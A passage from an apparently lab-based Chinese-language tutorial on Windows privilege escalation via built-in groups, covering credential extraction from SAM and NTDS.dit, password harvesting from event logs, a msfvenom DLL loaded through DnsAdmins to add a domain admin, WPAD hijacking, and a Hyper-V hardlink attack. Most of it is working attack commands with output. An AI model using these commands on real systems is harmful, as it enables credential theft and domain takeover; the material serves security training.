等工具离线提取本地帐户凭据。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">reg</span> <span class="title">save</span> <span class="title">HKLM</span>\<span class="title">SYSTEM</span> <span class="title">SYSTEM.SAV</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">reg</span> <span class="title">save</span> <span class="title">HKLM</span>\<span class="title">SAM</span> <span class="title">SAM.SAV</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><p>如果文件夹或文件对当前用户或所属的组有明确的拒绝条目，那么即使指定了<code>FILE_FLAG_BACKUP_SEMANTICS</code>标志，这也将阻止访问它。</p><h4 id="提取-NTDS-dit-凭据"><a href="#提取-NTDS-dit-凭据" class="headerlink" title="提取 NTDS.dit 凭据"></a>提取 NTDS.dit 凭据</h4><p>复制 NTDS.dit 后，可以使用工具（例如 Impackt <code>secretsdump.py</code>或 PowerShell<code>DSInternals</code>模块）提取所有 Active Directory 帐户凭据。</p><p>PowerShell DSInternals</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\DSInternals.psd1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$key</span> = <span class="built_in">Get-BootKey</span> <span class="literal">-SystemHivePath</span> .\SYSTEM</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADDBAccount</span> <span class="literal">-DistinguishedName</span> <span class="string">&#x27;CN=administrator,CN=users,DC=inlanefreight,DC=local&#x27;</span> <span class="literal">-DBPath</span> .\ntds.dit <span class="literal">-BootKey</span> <span class="variable">$key</span></span><br></pre></td></tr></table></figure><p>Impackt secretsdump.py</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL</span></span><br></pre></td></tr></table></figure><h2 id="Event-Log-Readers"><a href="#Event-Log-Readers" class="headerlink" title="Event Log Readers"></a>Event Log Readers</h2><p>假设启用了对进程创建事件和相应命令行的审核 <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation">auditing of process creation</a>。在这种情况下，此信息将作为事件 ID <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688">4688: A new process has been created</a> 保存到 Windows 安全事件日志中.</p><p>管理员或事件日志读取者组的成员有权访问此日志。</p><p>确认组成员身份</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">localgroup</span> &quot;<span class="title">Event</span> <span class="title">Log</span> <span class="title">Readers</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Alias</span> <span class="title">name</span>     <span class="title">Event</span> <span class="title">Log</span> <span class="title">Readers</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>        <span class="title">Members</span> <span class="title">of</span> <span class="title">this</span> <span class="title">group</span> <span class="title">can</span> <span class="title">read</span> <span class="title">event</span> <span class="title">logs</span> <span class="title">from</span> <span class="title">local</span> <span class="title">machine</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Members</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">logger</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure><p>使用 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil">wevtutil</a> 或 <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1">Get-WinEvent</a> 从命令行查询 Windows 事件。</p><p>wevtutil</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wevtutil</span> <span class="title">qe</span> <span class="title">Security</span> /<span class="title">rd:true</span> /<span class="title">f:text</span> | <span class="title">Select</span>-<span class="title">String</span> &quot;/<span class="title">user</span>&quot;</span></span><br><span class="line"><span class="function"># <span class="title">or</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">wevtutil</span> <span class="title">qe</span> <span class="title">Security</span> /<span class="title">rd:true</span> /<span class="title">f:text</span> /<span class="title">r:share01</span> /<span class="title">u:julie</span>.<span class="title">clay</span> /<span class="title">p:Welcome1</span> | <span class="title">findstr</span> &quot;/<span class="title">user</span>&quot;</span></span><br></pre></td></tr></table></figure><p>Get-WinEvent</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> security | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="number">4688</span> <span class="operator">-and</span> <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value <span class="operator">-like</span> <span class="string">&#x27;*/user*&#x27;</span>&#125; | <span class="built_in">Select-Object</span> <span class="selector-tag">@</span>&#123;name=<span class="string">&#x27;CommandLine&#x27;</span>;expression=&#123; <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value &#125;&#125;</span><br><span class="line"></span><br><span class="line">CommandLine</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意</strong>：使用 Get-WInEvent 搜索安全事件日志需要管理员访问权限或在注册表项 HKLM\System\CurrentControlSet\Services\Eventlog\Security 上调整权限。仅加入事件日志读取器组是不够的。</p></blockquote><h2 id="DnsAdmins"><a href="#DnsAdmins" class="headerlink" title="DnsAdmins"></a>DnsAdmins</h2><p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins">DnsAdmins</a>组的成员有权访问网络上的 DNS 信息。Windows DNS 服务支持自定义插件，并可从中调用函数来解析不在任何本地托管 DNS 区域范围内的名称查询，DNS服务以<code>NT AUTHORITY\SYSTEM</code>的身份运行。</p><p> DNS 在域控制器上运行（这非常常见）时，可以执行以下攻击：</p><ul><li>DNS 管理通过 RPC 执行</li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723">ServerLevelPluginDll</a>允许加载自定义 DLL，而无需验证 DLL 的路径。这可以通过<code>dnscmd</code>命令行中的工具完成</li><li>当<code>DnsAdmins</code>组成员运行<code>dnscmd</code>以下命令时，将填充注册表项<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code></li><li>当重新启动 DNS 服务时，将加载此路径中的 DLL（即域控制器的机器帐户可以访问的网络共享）</li><li>攻击者可以加载自定义 DLL 来获取反向 shell，甚至可以加载 Mimikatz 等工具作为 DLL 来转储凭据。</li></ul><h3 id="DnsAdmins-访问权限利用"><a href="#DnsAdmins-访问权限利用" class="headerlink" title="DnsAdmins 访问权限利用"></a>DnsAdmins 访问权限利用</h3><p>使用<code>msfvenom</code>生成一个恶意 DLL，将用户添加到<code>domain admins</code>组中。将恶意文件传输至目标机器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/x64/exec cmd=&#x27;net group &quot;domain admins&quot; netadm /add /domain&#x27; -f dll -o adduser.dll</span><br></pre></td></tr></table></figure><p>查询 DnsAdmins 组的成员</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">Get-ADGroupMember</span> <span class="literal">-Identity</span> DnsAdmins</span><br><span class="line"></span><br><span class="line">distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">name              : netadm</span><br><span class="line">objectClass       : user</span><br><span class="line">objectGUID        : <span class="number">1</span>a1ac159<span class="literal">-f364-4805-a4bb-7153051a8c14</span></span><br><span class="line">SamAccountName    : netadm</span><br><span class="line">SID               : S<span class="literal">-1-5-21-669053619-2741956077-1013132368-1109</span>   </span><br></pre></td></tr></table></figure><p>将恶意文件传输到目标机器后，以 DnsAdmins 组的成员身份加载恶意文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">dnscmd.exe</span> /<span class="title">config</span> /<span class="title">serverlevelplugindll</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">netadm</span>\<span class="title">Desktop</span>\<span class="title">adduser.dll</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Registry</span> <span class="title">property</span> <span class="title">serverlevelplugindll</span> <span class="title">successfully</span> <span class="title">reset</span>.</span></span><br><span class="line"><span class="function"><span class="title">Command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：必须指定自定义 DLL 的完整路径，否则攻击将无法正常工作。</p></blockquote><p><code>DnsAdmins</code> 组的成员只能使用 <code>dnscmd</code> 实用程序进行操作，因为他们没有直接对注册表项的权限。</p><p>配置包含恶意插件路径的注册表设置并创建有效负载后，下次启动 DNS 服务时将加载 DLL。DnsAdmins 组的成员身份不具备重新启动 DNS 服务的能力，但可以想象系统管理员可能会允许 DNS 管理员执行此操作。</p><p>重新启动 DNS 服务后（如果用户具有此级别的访问权限），应该能够运行自定义 DLL 并添加用户或获取反向 shell。如果无权重新启动 DNS 服务器，将不得不等到服务器或服务重新启动。让检查当前用户对 DNS 服务的权限。</p><p>首先，查询用户 SID</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">useraccount</span> <span class="title">where</span> <span class="title">name</span>=&quot;<span class="title">netadm</span>&quot; <span class="title">get</span> <span class="title">sid</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SID</span></span></span><br><span class="line"><span class="function"><span class="title">S</span>-1-5-21-669053619-2741956077-1013132368-1109</span></span><br></pre></td></tr></table></figure><p>DNS 服务的权限，<a href="https://www.winhelponline.com/blog/view-edit-service-permissions-windows/">RPWP</a> 权限，分别转换为 SERVICE_START 和 SERVICE_STOP。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">sdshow</span> <span class="title">DNS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:(<span class="title">A</span>;;<span class="title">CCLCSWLOCRRC</span>;;;<span class="title">IU</span>)(<span class="title">A</span>;;<span class="title">CCLCSWLOCRRC</span>;;;<span class="title">SU</span>)(<span class="title">A</span>;;<span class="title">CCLCSWRPWPDTLOCRRC</span>;;;<span class="title">SY</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">BA</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">SO</span>)(<span class="title">A</span>;;<span class="title">RPWP</span>;;;<span class="title">S</span>-1-5-21-669053619-2741956077-1013132368-1109)<span class="title">S</span>:(<span class="title">AU</span>;<span class="title">FA</span>;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">WD</span>)</span></span><br></pre></td></tr></table></figure><p>重启 DNS 服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">stop</span> <span class="title">dns</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">sc</span> <span class="title">start</span> <span class="title">dns</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">dns</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">STATE</span>              : 2  <span class="title">START_PENDING</span></span></span><br><span class="line"><span class="function">                                (<span class="title">NOT_STOPPABLE</span>, <span class="title">NOT_PAUSABLE</span>, <span class="title">IGNORES_SHUTDOWN</span>)</span></span><br><span class="line"><span class="function">        <span class="title">WIN32_EXIT_CODE</span>    : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_EXIT_CODE</span>  : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">CHECKPOINT</span>         : 0<span class="title">x0</span></span></span><br><span class="line"><span class="function">        <span class="title">WAIT_HINT</span>          : 0<span class="title">x7d0</span></span></span><br><span class="line"><span class="function">        <span class="title">PID</span>                : 6960</span></span><br><span class="line"><span class="function">        <span class="title">FLAGS</span>              :</span></span><br></pre></td></tr></table></figure><p>确认组成员身份</p><p>如果一切按计划进行，帐户将被添加到域管理员组，或者如果自定义 DLL 可以让重新建立连接，帐户就会收到反向 shell。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">group</span> &quot;<span class="title">Domain</span> <span class="title">Admins</span>&quot; /<span class="title">dom</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Group</span> <span class="title">name</span>     <span class="title">Domain</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>        <span class="title">Designated</span> <span class="title">administrators</span> <span class="title">of</span> <span class="title">the</span> <span class="title">domain</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Members</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>            <span class="title">netadm</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure><h3 id="Clean"><a href="#Clean" class="headerlink" title="Clean"></a>Clean</h3><p>在域控制器上更改配置并停止&#x2F;重新启动 DNS 服务是非常具有破坏性的操作，必须非常小心地执行。</p><p>必须使用本地或域管理员帐户从提升的控制台执行这些步骤。</p><p>确认<code>ServerLevelPluginDll</code>注册表项是否存在。除非删除自定义 DLL，否则将无法再次正确启动 DNS 服务。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">reg</span> <span class="title">query</span> \\10.129.43.9\<span class="title">HKLM</span>\<span class="title">SYSTEM</span>\<span class="title">CurrentControlSet</span>\<span class="title">Services</span>\<span class="title">DNS</span>\<span class="title">Parameters</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">SYSTEM</span>\<span class="title">CurrentControlSet</span>\<span class="title">Services</span>\<span class="title">DNS</span>\<span class="title">Parameters</span></span></span><br><span class="line"><span class="function">    <span class="title">GlobalQueryBlockList</span>    <span class="title">REG_MULTI_SZ</span>    <span class="title">wpad</span>\0<span class="title">isatap</span></span></span><br><span class="line"><span class="function">    <span class="title">EnableGlobalQueryBlockList</span>    <span class="title">REG_DWORD</span>    0<span class="title">x1</span></span></span><br><span class="line"><span class="function">    <span class="title">PreviousLocalHostname</span>    <span class="title">REG_SZ</span>    <span class="title">WINLPE</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">    <span class="title">Forwarders</span>    <span class="title">REG_MULTI_SZ</span>    1.1.1.1\08.8.8.8</span></span><br><span class="line"><span class="function">    <span class="title">ForwardingTimeout</span>    <span class="title">REG_DWORD</span>    0<span class="title">x3</span></span></span><br><span class="line"><span class="function">    <span class="title">IsSlave</span>    <span class="title">REG_DWORD</span>    0<span class="title">x0</span></span></span><br><span class="line"><span class="function">    <span class="title">BootMethod</span>    <span class="title">REG_DWORD</span>    0<span class="title">x3</span></span></span><br><span class="line"><span class="function">    <span class="title">AdminConfigured</span>    <span class="title">REG_DWORD</span>    0<span class="title">x1</span></span></span><br><span class="line"><span class="function">    <span class="title">ServerLevelPluginDll</span>    <span class="title">REG_SZ</span>    <span class="title">adduser.dll</span></span></span><br></pre></td></tr></table></figure><p>使用<code>reg delete</code>命令来删除指向自定义 DLL 的键。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">reg</span> <span class="title">delete</span> \\10.129.43.9\<span class="title">HKLM</span>\<span class="title">SYSTEM</span>\<span class="title">CurrentControlSet</span>\<span class="title">Services</span>\<span class="title">DNS</span>\<span class="title">Parameters</span>  /<span class="title">v</span> <span class="title">ServerLevelPluginDll</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Delete</span> <span class="title">the</span> <span class="title">registry</span> <span class="title">value</span> <span class="title">ServerLevelPluginDll</span> (<span class="title">Yes</span>/<span class="title">No</span>)? <span class="title">Y</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure><p>重新启动DNS服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">stop</span> <span class="title">dns</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">sc.exe</span> <span class="title">start</span> <span class="title">dns</span></span></span><br></pre></td></tr></table></figure><p>检查DNS服务状态</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">query</span> <span class="title">dns</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">dns</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">STATE</span>              : 4  <span class="title">RUNNING</span></span></span><br><span class="line"><span class="function">                                (<span class="title">STOPPABLE</span>, <span class="title">PAUSABLE</span>, <span class="title">ACCEPTS_SHUTDOWN</span>)</span></span><br><span class="line"><span class="function">        <span class="title">WIN32_EXIT_CODE</span>    : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_EXIT_CODE</span>  : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">CHECKPOINT</span>         : 0<span class="title">x0</span></span></span><br><span class="line"><span class="function">        <span class="title">WAIT_HINT</span>          : 0<span class="title">x0</span></span></span><br></pre></td></tr></table></figure><p>还可以利用 Mimikatz 工具创建者的 <a href="https://github.com/gentilkiwi/mimikatz/tree/master/mimilib">mimilib.dll</a>，通过修改 <a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c">kdns.c</a> 文件来执行反向 shell 单行命令或选择的其他命令来获得命令执行能力。</p><h3 id="创建-WPAD-记录"><a href="#创建-WPAD-记录" class="headerlink" title="创建 WPAD 记录"></a>创建 WPAD 记录</h3><p>滥用 DnsAdmins 组权限的另一种方法是创建 WPAD 记录。此组的成员身份赋予<a href="https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps">禁用全局查询阻止安全性</a>的权限，默认情况下会阻止此攻击。Server 2008 首次引入了在 DNS 服务器上添加到全局查询阻止列表的功能。默认情况下，Web 代理自动发现协议 (WPAD) 和站内自动隧道寻址协议 (ISATAP) 位于全局查询阻止列表中。这些协议很容易被劫持，任何域用户都可以创建包含这些名称的计算机对象或 DNS 记录。</p><p>禁用全局查询阻止列表并创建 WPAD 记录后，每台运行 WPAD 且设置默认的机器的流量都将通过攻击机器进行代理。可以使用<a href="https://github.com/lgandx/Responder">Responder</a>或<a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>等工具执行流量欺骗，并尝试捕获密码哈希并离线破解它们或执行 SMBRelay 攻击。</p><p>禁用了全局查询阻止列表</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">Set-DnsServerGlobalQueryBlockList</span> <span class="literal">-Enable</span> <span class="variable">$false</span> <span class="literal">-ComputerName</span> dc01.inlanefreight.local</span><br></pre></td></tr></table></figure><p>添加指向攻击机器的 WPAD 记录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">Add-DnsServerResourceRecordA</span> <span class="literal">-Name</span> wpad <span class="literal">-ZoneName</span> inlanefreight.local <span class="literal">-ComputerName</span> dc01.inlanefreight.local <span class="literal">-IPv4Address</span> <span class="number">10.10</span>.<span class="number">14.3</span></span><br></pre></td></tr></table></figure><h2 id="Hyper-V-Administrators"><a href="#Hyper-V-Administrators" class="headerlink" title="Hyper-V Administrators"></a>Hyper-V Administrators</h2><p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators">Hyper -V 管理员</a>组对所有<a href="https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines">Hyper-V 功能</a>具有完全访问权限。如果域控制器已虚拟化，则 <code>Hyper-V Administrators</code> 应被视为域管理员。他们可以轻松创建实时域控制器的克隆并离线安装虚拟磁盘以获取 NTDS.dit 文件并提取域中所有用户的 NTLM 密码哈希。</p><p>这篇<a href="https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/">blog</a>中也有详细记录，删除虚拟机后，<code>vmms.exe</code> 会尝试恢复相应 <code>.vhdx</code> 文件的原始文件权限，并以 <code>NT AUTHORITY\SYSTEM</code> 身份执行此操作，而无需冒充用户。可以删除 <code>.vhdx</code> 文件并创建一个本机硬链接，将此文件指向受保护的 SYSTEM 文件，将拥有该文件的完全权限。</p><p>如果操作系统存在 <a href="https://www.tenable.com/cve/CVE-2018-0952">CVE-2018-0952</a> 或 <a href="https://www.tenable.com/cve/CVE-2019-0841">CVE-2019-0841</a> 漏洞，也可以利用这些漏洞获取 SYSTEM 权限。</p><p>一个例子是 Firefox，它安装了 Mozilla 维护服务。可以更新<a href="https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1">此漏洞</a>（NT 硬链接的概念验证），以授予当前用户对以下文件的完全权限：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Mozilla</span> <span class="title">Maintenance</span> <span class="title">Service</span>\<span class="title">maintenanceservice.exe</span></span></span><br></pre></td></tr></table></figure><p>运行一下命令后，应该可以完全控制此文件并获取其所有权。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">takeown</span> /<span class="title">F</span> <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Mozilla</span> <span class="title">Maintenance</span> <span class="title">Service</span>\<span class="title">maintenanceservice.exe</span></span></span><br></pre></td></tr></table></figure><p>启动 Mozilla 维护服务，并用恶意的 MaintenanceService.exe 替换此文件，启动维护服务，并以 SYSTEM 身份执行命令。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">start</span> <span class="title">MozillaMaintenance</span></span></span><br></pre></td></tr></table></figure><blockquote><p>注意：2020 年 3 月的 Windows 安全更新已缓解此向量的影响，更新改变了与硬链接相关的行为。</p></blockquote><h2 id="Print-Operators"><a href="#Print-Operators" class="headerlink" title="Print Operators"></a>Print Operators</h2><p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators">Print Operators</a>是一个具有高权限的组，Print Operators 授予其成员 <code>SeLoadDriverPrivilege</code>、管理、创建、共享和删除连接到域控制器的打印机的权限，以及本地登录域控制器并将其关闭的能力。如果发出命令 <code>whoami /priv</code>，并且在未提升的上下文中看不到 <code>SeLoadDriverPrivilege</code>，则需要绕过 UAC。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">whoami</span> /<span class="title">priv</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PRIVILEGES</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function">----------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> <span class="title">Name</span>           <span class="title">Description</span>                          <span class="title">State</span></span></span><br><span class="line"><span class="function">======================== =================================    =======</span></span><br><span class="line"><span class="function"><span class="title">SeIncreaseQuotaPrivilege</span> <span class="title">Adjust</span> <span class="title">memory</span> <span class="title">quotas</span> <span class="title">for</span> <span class="title">a</span> <span class="title">process</span>   <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>  <span class="title">Bypass</span> <span class="title">traverse</span> <span class="title">checking</span>             <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeShutdownPrivilege</span>      <span class="title">Shut</span> <span class="title">down</span> <span class="title">the</span> <span class="title">system</span>                 <span class="title">Disabled</span></span></span><br></pre></td></tr></table></figure><h3 id="开启-SeLoadDriverPrivilege"><a href="#开启-SeLoadDriverPrivilege" class="headerlink" title="开启 SeLoadDriverPrivilege"></a>开启 SeLoadDriverPrivilege</h3><p><a href="https://github.com/hfiref0x/UACME">UACMe</a> 仓库提供了完整的 UAC 绕过列表，可以从命令行使用。或者，从 GUI，可以打开管理命令 shell 并输入属于 Print Operators 组成员的帐户的凭据。如果再次检查权限，<code>SeLoadDriverPrivilege</code> 是可见的，但已被禁用。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 